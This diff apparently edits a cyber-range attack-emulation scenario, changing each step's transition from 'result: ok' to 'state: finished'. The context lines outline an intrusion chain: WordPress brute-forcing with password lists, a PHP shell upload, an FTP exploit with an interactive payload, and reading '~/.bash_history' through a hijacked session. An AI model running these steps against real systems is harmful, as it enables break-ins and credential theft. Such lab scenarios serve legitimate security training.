@@ -16,8 +16,8 @@ stages:
               - 80
               - 3306
           next:
-            - type: result
-              value: ok
+            - type: state
+              value: finished
               step: scan-wordpress-site
 
         scan-wordpress-site:
@@ -37,8 +37,8 @@ stages:
             target: {{ networks.public.hosts.wordpress }}
             options: --script http-wordpress-brute --script-args 'userdb=/opt/resources/user_list.txt,passdb=/opt/resources/pass_list.txt,http-wordpress-brute.threads=3,brute.firstonly=true'
           next:
-            - type: result
-              value: ok
+            - type: state
+              value: finished
               step: upload-php-shell
 
         upload-php-shell:
@@ -79,8 +79,8 @@ stages:
               SUBNET: {{ networks.server_net.subnet_ip }}
               SESSION: $upload-php-shell|session_id
           next:
-            - type: result
-              value: ok
+            - type: state
+              value: finished
               step: scan-ftp-server
 
         scan-ftp-server:
@@ -91,8 +91,8 @@ stages:
               PORTS: 21
               RHOSTS: {{ networks.server_net.hosts.vulnerable_ftp }}
           next:
-            - type: result
-              value: ok
+            - type: state
+              value: finished
               step: scan-database-server
 
         scan-database-server:
@@ -119,8 +119,8 @@ stages:
               RHOSTS: {{ networks.server_net.hosts.vulnerable_ftp }}
               PAYLOAD: cmd/unix/interact
           next:
-            - type: result
-              value: ok
+            - type: state
+              value: finished
               step: read-ftp-logs
 
         read-ftp-logs:
@@ -146,8 +146,8 @@ stages:
               SUBNET: {{ networks.user_net.subnet_ip }}
               SESSION: $upload-php-shell|session_id
           next:
-            - type: result
-              value: ok
+            - type: state
+              value: finished
               step: scan-user-machine
 
         scan-user-machine:
@@ -188,8 +188,8 @@ stages:
             session_id: $bruteforce-user|session_id
             command: cat ~/.bash_history
           next:
-            - type: result
-              value: ok
+            - type: state
+              value: finished
               step: get-data-from-database
 
         get-data-from-database:
